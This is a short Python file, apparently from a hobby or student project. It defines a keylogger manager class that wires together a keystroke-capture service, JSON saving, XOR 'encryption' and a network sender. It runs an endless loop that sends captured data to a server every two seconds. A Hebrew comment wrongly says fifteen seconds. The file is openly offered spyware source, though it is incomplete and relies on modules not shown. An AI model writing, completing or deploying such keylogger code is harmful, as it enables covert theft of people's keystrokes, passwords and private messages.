from keyloggerservise import KeyloggerService
from file_writer import FileWriter
from encrypto import Encrypt
from network import NetworkWriter
import time

class KeyloggerManeger:
    def __init__(self):

        self.keylogger = KeyloggerService()
        self.file_writer = FileWriter()
        self.encrypt = Encrypt()
        self.network_writer = NetworkWriter()
        self.f()



    def getdata(self):

       return self.file_writer.save_to_json(self.keylogger.data)


    def crypt_data(self):
        encrypted_data = self.encrypt.xor(self.getdata())  # שמירת הפלט של ההצפנה
        return encrypted_data

    def send_data_to_server(self):

        self.network_writer.send_data()
       # self.data.clear()  # ננקה את הנתונים רק אם השליחה הצליחה

    def f(self):
        try:
            while True:
                time.sleep(2)  # כל 15 שניות שולח נתונים
                self.send_data_to_server()
        except KeyboardInterrupt:
            print("Keylogger stopped.")


maneger = KeyloggerManeger()


